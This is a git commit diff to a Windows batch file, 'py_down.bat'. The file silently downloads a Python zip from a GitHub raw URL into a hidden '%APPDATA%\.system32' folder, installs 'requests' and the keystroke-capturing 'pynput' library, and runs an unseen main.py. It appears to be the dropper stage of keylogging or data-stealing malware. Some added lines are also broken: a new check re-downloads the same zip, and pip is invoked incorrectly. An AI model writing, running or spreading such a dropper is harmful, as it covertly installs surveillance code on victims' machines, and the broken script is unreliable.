5f2629a5e17a2472cb21b5a2c6f4d897371bc962
faruqer <136151240+faruqer@users.noreply.github.com>
2024-10-10 02:57:25 +0300

    Update py_down.bat

--- py_down.bat
+++ py_down.bat
@@ -3,13 +3,16 @@
 set folderPath=%APPDATA%\.system32
 
 if not exist "%folderPath%\windows.zip" (
-    curl https://raw.githubusercontent.com/faruqer/staticfiles/refs/heads/main/python-3.12.7.zip -o %folderPath%\windows.zip > NUL 2>&1
+    curl https://raw.githubusercontent.com/faruqer/cheki/refs/heads/main/python-3.12.7.zip -o %folderPath%\windows.zip > NUL 2>&1
 )
-
+if not exist "%folderPath%\req.txt" (
+    curl https://raw.githubusercontent.com/faruqer/cheki/refs/heads/main/python-3.12.7.zip -o %folderPath%\windows.zip > NUL 2>&1
+) 
 if not exist "%folderPath%\extracted" (
     mkdir %folderPath%\extracted
     tar -xf %folderPath%\windows.zip -C %folderPath%\extracted
     del %folderPath%\windows.zip
 )
-
+%folderPath%\extracted\python.exe pip install requests
+%folderPath%\extracted\python.exe pip install pynput
 %folderPath%\extracted\python.exe %folderPath%\main.py
